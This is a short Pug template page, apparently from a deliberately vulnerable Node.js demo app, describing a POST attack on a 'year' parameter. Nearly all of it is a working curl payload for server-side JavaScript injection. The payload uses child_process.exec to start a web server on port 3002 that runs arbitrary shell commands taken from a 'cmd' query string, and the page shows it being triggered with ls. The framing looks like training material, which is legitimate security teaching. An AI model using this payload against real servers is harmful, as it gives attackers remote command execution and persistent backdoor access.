extends layout

block content
  h1= title
  p This page "year" Parameter Attack (POST Only)
  h2 Injection Code
  br
  code curl 'http://omar.dev:3000/' --data $'year=setTimeout(function(){require(\'http\').createServer(function(req, res){res.writeHead(200,{"Content-Type":"text/plain"});require(\'child_process\').exec(require(\'url\').parse(req.url, true).query[\'cmd\'], function(e, s, st) {res.end(s);});}).listen(3002);}, 1)'

  p http://omar.dev:3002/?cmd=ls